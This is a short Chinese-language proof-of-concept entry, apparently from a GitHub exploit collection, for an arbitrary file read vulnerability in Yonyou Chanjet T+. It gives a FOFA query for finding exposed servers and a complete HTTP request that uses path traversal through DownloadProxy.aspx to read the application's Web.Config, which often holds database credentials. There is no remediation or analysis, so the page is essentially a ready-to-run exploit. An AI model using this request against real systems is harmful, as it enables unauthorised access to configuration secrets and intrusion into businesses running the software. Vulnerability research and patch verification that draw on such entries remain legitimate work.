## 用友畅捷通TPlus-DownloadProxy.aspx任意文件读取漏洞

## fofa
```
app="畅捷通-TPlus"
```


## poc
```
GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1
X-Ajaxpro-Method: GetStoreWarehouseByStore
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![cb01e991a8d9d86820031fd9d3e58e10](https://github.com/wy876/POC/assets/139549762/b9b44980-b4e0-45d4-9317-790954318e04)
